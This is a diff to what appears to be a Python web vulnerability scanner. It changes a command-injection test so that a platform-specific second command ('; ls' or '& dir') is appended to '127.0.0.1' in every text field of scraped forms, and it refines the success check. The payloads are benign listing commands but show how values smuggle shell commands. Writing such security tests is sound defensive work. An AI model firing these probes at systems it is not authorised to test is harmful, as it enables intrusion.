@@ -1,6 +1,8 @@
 import sys
 import requests
 from bs4 import BeautifulSoup
+import platform
+
 
 
 def create_session():
@@ -138,12 +140,17 @@ def test_xss(base_url, session):
 
 def test_command_injection(base_url, session):
     results = []
+    if platform.system() == "Windows":
+        command = "& dir"
+    else:
+        command = "; ls"
+        
 
     forms = parse_input_fields(base_url, session)
     for form in forms:
         form_action = base_url + form["action"]
         payload = {
-            input_field["name"]: "127.0.0.1; ls" if input_field["type"] == "text" else "test"
+            input_field["name"]: f"127.0.0.1 {command}" if input_field["type"] == "text" else "test"
             for input_field in form["inputs"] if input_field["name"]
         }
         try:
@@ -152,7 +159,7 @@ def test_command_injection(base_url, session):
             else:
                 response = session.get(form_action, params=payload)
             results.append(f"\n[DEBUG] Command Injection Response:")
-            if "app" in response.text or "bin" in response.text:
+            if "app.py" in response.text or "bin" in response.text:
                 results.append(f"[+] Command Injection successful!")
             else:
                 results.append(f"[-] Command Injection failed.")
